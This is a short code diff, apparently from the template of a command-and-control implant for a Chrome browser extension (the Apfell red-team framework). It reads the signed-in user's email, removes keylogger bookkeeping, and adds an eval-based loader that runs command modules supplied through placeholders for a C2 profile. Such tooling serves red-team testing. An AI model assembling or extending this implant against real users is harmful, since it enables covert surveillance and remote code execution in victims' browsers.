@@ -57,15 +57,24 @@ class baseC2 {
     }
 }
 
+// C2 Profile Code
+C2PROFILE_HERE
+
 //-------------SHARED COMMAND CODE ------------------------
-let keylogTaskID = 0;
-let keyloggers = [];
-
-
 chrome.identity.getProfileUserInfo(function(info){
     apfell.userinfo = info.email;
 });
-// C2 Profile Code
-C2PROFILE_HERE
+
+default_load = function(contents){
+    var module = {exports: {}};
+    var exports = module.exports;
+    eval(contents);
+    return module.exports;
+};
+
+let exports = {};
 // Commands
 COMMANDS_HERE
+
+var commands_dict = exports;
+C2.commands = Object.keys(commands_dict);
